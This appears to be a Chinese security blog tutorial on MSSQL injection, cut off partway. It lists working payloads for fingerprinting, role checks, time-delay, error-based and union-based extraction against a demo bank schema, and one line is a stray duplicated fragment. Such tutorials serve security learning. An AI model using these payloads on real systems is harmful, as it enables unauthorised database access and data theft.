---
title: 干货 | MSSQL注入和漏洞利用姿势总结
url: https://www.secpulse.com/archives/193819.html
source: 安全脉搏
date: 2022-12-22
fetch_date: 2025-10-04T02:12:36.153058
---

# 干货 | MSSQL注入和漏洞利用姿势总结

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 干货 | MSSQL注入和漏洞利用姿势总结

[漏洞](https://www.secpulse.com/archives/category/vul)

[HACK\_Learn](https://www.secpulse.com/newpage/author?author_id=8971)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-12-21

16,768

# 基础介绍

Microsoft SQL Server 是微软开发的关系型数据库管理系统。作为数据库服务器，它是一种软件产品，主要功能是根据其他软件应用程序的请求存储和检索数据，这些应用程序可以在同一台计算机上运行，也可以在网络（包括 Internet）上的另一台计算机上运行。SQL Server 默认开放的端口是 TCP 1433。

# SQL Server 信息收集

* • 判断数据库类型

```
/* sysobjects 为 MSSQL 数据库中独有的数据表，如果页面返回正常即可表示为 MSSQL 数据库 */
?id=1 and (select count(*) from sysobjects)>0 --
/* 通过 MSSQL 数据库中特有的延时函数进行判断 */
?id=1;WAITFOR DELAY '00:00:10'; --
```

* • 查询数据库版本信息

```
1 and 1=(select @@version) --
```

* • 判断当前数据库用户名

```
?id=1 and user>0;--
```

* • 获取当前数据库名

```
?id=1 and db_name()>0;--
```

* • 判断字段个数

```
?id=1 order by 6--
```

* • 查询当前的本地服务名

```
?id=1 and 1=(select @@servername)--
```

* • 判断是否站库分离

```
/* 如果页面报错，则站库分离；回显正常，则无站库分离 */
?id=1 and ((select host_name())=(select @@servername))--
```

* • 判断当前服务器级别角色（Server-level roles）

```
?id=1 and 1=(select is_srvrolemember('sysadmin'))--
?id=1 and 1=(select is_srvrolemember('serveradmin'))--
?id=1 and 1=(select is_srvrolemember('securityadmin'))--
?id=1 and 1=(select is_srvrolemember('processadmin'))--
?id=1 and 1=(select is_srvrolemember('setupadmin'))--
?id=1 and 1=(select is_srvrolemember('bulkadmin'))--
?id=1 and 1=(select is_srvrolemember('diskadmin'))--
?id=1 and 1=(select is_srvrolemember('dbcreator'))--
?id=1 and 1=(select is_srvrolemember('public'))--
```

为便于管理数据库中的权限，SQL Server 提供了若干角色，这些角色是用于对其他主体进行分组的安全主体。它们类似于 Windows 操作系统中的组。SQL Server 2019 和以前的版本提供了 9 个不同级别的服务器级角色以帮助用户管理服务器上的权限。这些角色是可组合其他主体的安全主体，并且遵循最地特权原则。服务器级角色的权限作用域为服务器范围。

下表显示了固定的服务器级角色及其功能。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193819-1671593391.png "null")

* • 判断当前数据库级别角色（Database-level roles）

```
?id=1 and 1=(select IS_ROLEMEMBER('db_owner'))--
?id=1 and 1=(select IS_ROLEMEMBER('db_securityadmin'))--
?id=1 and 1=(select IS_ROLEMEMBER('db_accessadmin'))--
?id=1 and 1=(select IS_ROLEMEMBER('db_backupoperator'))--
?id=1 and 1=(select IS_ROLEMEMBER('db_ddladmin'))--
?id=1 and 1=(select IS_ROLEMEMBER('db_datawriter'))--
?id=1 and 1=(select IS_ROLEMEMBER('db_datareader'))--
?id=1 and 1=(select IS_ROLEMEMBER('db_denydatawriter'))--
```

数据库级角色的权限作用域为数据库范围，下表显示了固定数据库角色及其能够执行的操作。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193819-1671593392.png "null")

# SQL Server 注入

## 报错注入

MSSQL 数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。前提是服务器允许返回报错信息。

* • 查询当前数据库中的表名

```
?id=1 and 1=(select top 1 name from sysobjects where xtype='u');--
?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts'));--
?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers'));--
?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates'));--
('fsb_accounts', 'fsb_fund_transfers'));--
?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates'));--
?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates', 'fsb_messages'));--
?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates', 'fsb_messages', 'fsb_transactions'));--
?id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name not in ('fsb_accounts', 'fsb_fund_transfers', 'fsb_loan_rates', 'fsb_messages', 'fsb_transactions', 'fsb_users'));--
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193819-1671593393.png "null")

* • 查询表中的字段名

```
?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_accounts'));--
?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_accounts') and name<>'account_no');--
?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_accounts') and name<>'account_no' and name<>'account_type');--
?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'fsb_accounts') and name<>'account_no' and name<>'account_type' and name<>'balance_amount');--
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193819-1671593394.png "null")
> 值得一提的是，在 MSSQL 中除了借助 `sysobjects` 表和 `syscolumns` 表获取表名、列名外，MSSQL 数据库中也兼容 `information_schema`，里面存放了数据表表名和字段名。使用方法与 MySQL 相同。
>
> `/* 查询表名可以用 information_schema.tables */
> ?id=1 and 1=(select top 1 table_name from information_schema.tables);--
> /* 查询列名可以用 information_schema.columns */
> ?id=1 and 1=(select top 1 column_name from information_schema.columns where table_name='fsb_accounts');--`

* • 查询表中具体的数据

```
?id=1 and 1=(select top 1 branch from fsb_accounts);--
?id=1 and 1=(select top 1 branch from fsb_accounts where branch<>'Texas-Remington Circle');--
?id=1 and 1=(select top 1 branch from fsb_accounts where branch not in ('Texas-Remington Circle', 'Mahnattan - New york'));--
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193819-1671593400.png "null")

## 联合注入

方法与一般的 SQL 联合注入相同。值得注意的是，MSSQL 联合注入一般不使用数字占位，而是 `NULL`，因为使用数字占位可能会发生隐式转换。

```
?id=1 union select NULL, NULL ,NULL, NULL, NULL from fsb_users--
?id=1 union select NULL, user_name, NULL, NULL, NULL from fsb_users--
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193819-1671593402.png "null")

#...